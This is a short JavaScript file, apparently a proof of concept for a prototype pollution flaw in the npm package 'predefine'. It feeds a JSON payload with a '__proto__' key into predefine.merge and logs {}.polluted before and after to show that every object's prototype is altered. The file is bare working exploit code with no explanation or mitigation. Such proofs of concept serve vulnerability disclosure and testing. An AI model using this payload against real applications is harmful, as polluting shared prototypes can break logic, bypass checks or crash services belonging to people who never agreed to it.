var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
var predefine = require('predefine');
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
predefine.merge(obj, payload);
console.log({}.polluted);